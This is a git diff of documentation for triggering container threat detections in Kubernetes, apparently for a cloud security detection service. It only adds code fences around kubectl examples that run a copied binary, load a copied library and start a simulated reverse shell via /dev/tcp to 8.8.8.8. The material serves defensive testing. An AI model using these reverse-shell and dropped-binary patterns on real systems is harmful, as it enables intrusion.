@@ -63,17 +63,20 @@ kubectl run --restart=Never --rm=true --wait=true -i \
 "$tag" -- bash -c "cp /bin/ls /tmp/$tag; /tmp/$tag"
 ```
 1. Add a library to a running container
+```
 tag="dropped-library-$(date +%Y-%m-%d-%H-%M-%S)"
 kubectl run --restart=Never --rm=true --wait=true -i \
 --image marketplace.gcr.io/google/ubuntu1804:latest \
 "$tag" -- bash -c "cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/$tag; /lib64/ld-linux-x86-64.so.2 /tmp/$tag"
+```
 
 1. Start a reverse shell in running container
+```
 tag="reverse-shell-$(date +%Y-%m-%d-%H-%M-%S)"
 kubectl run --restart=Never --rm=true --wait=true -i \
 --image marketplace.gcr.io/google/ubuntu1804:latest \
 "$tag" -- bash -c "/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1"
-
+```
 
 ### Optional Deploy a Cloud Build environment
 
